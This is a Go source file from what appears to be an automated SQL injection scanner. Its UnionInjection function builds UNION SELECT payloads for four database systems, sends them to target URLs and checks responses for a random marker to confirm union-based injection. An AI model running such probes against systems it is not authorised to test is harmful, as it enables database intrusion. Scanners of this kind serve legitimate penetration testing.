package injections

import (
	"GoInjection/backend/helper"
	helper2 "GoInjection/backend/injections/helper"
	"GoInjection/backend/query"
	"GoInjection/backend/structs"
	"encoding/hex"
	"fmt"
	"math/rand"
	"strings"
)

var unionPayloads = map[string][]string{
	"PostgresSQL": {
		"UNION SELECT §",
	},
	"MySQL": {
		"UNION SELECT §",
	},
	"MsSQL": {
		"UNION SELECT §",
	},
	"SQLite": {
		"UNION SELECT §",
	},
}

func UnionInjection(url string) (bool, string) {
	var mode = "concat" // hardcoded for now.
	cleanedURLs, err := helper.GetUrls(url)
	helper.LogError(err)

	q := query.Query{DBMS: structs.TargetSyntax}
	for _, cleanedURL := range cleanedURLs {
		if payloads, ok := unionPayloads[structs.TargetSyntax]; ok {
			for _, payload := range payloads {

				var identifierString = fmt.Sprintf("%08d", rand.Int63n(1e8))
				var identifierBytes = hex.EncodeToString([]byte(identifierString))

				editor := query.Editor{}

				if mode == "concat" {
					editor = query.Editor{Type: "concat", TypeValue: identifierBytes, Repeat: structs.TargetColumns}
				} else if mode == "string" {
					editor = query.Editor{Type: "string", TypeValue: identifierString, Repeat: structs.TargetColumns}
				}

				editedPayload := editor.Edit(payload)

				generatedPayloads, status := q.Build(editedPayload)
				if status != "Success" {
					return false, fmt.Sprintf("Error generating payloads: %s", status)
				}

				for _, generatedPayload := range generatedPayloads {
					response, statusCode := helper.SendRequest(strings.ReplaceAll(cleanedURL, helper.PayloadReplaceString, helper.URLEncodeQuery(generatedPayload)))
					structs.UnionLinks++

					if statusCode >= 500 || strings.Contains(strings.ToLower(response), "sql syntax") || strings.Contains(strings.ToLower(response), "sql error") || strings.Contains(strings.ToLower(response), "database error") || strings.Contains(strings.ToLower(response), "exception") {
						continue
					}

					if mode == "concat" {
						if strings.Contains(response, identifierBytes) {
							helper.LogLine("Union-based injection detected.")
							structs.TargetUnion = true
							return true, generatedPayload
						}
					} else if mode == "string" {
						words := helper2.CountWords(response)
						for word, count := range words {
							if count == structs.TargetColumns && word == strings.ToLower(identifierString) {
								helper.LogLine("Union-based injection detected.")
								structs.TargetUnion = true
								return true, generatedPayload
							}
						}
					}
				}
			}
		}
	}

	return false, "No Union-based injection detected."
}
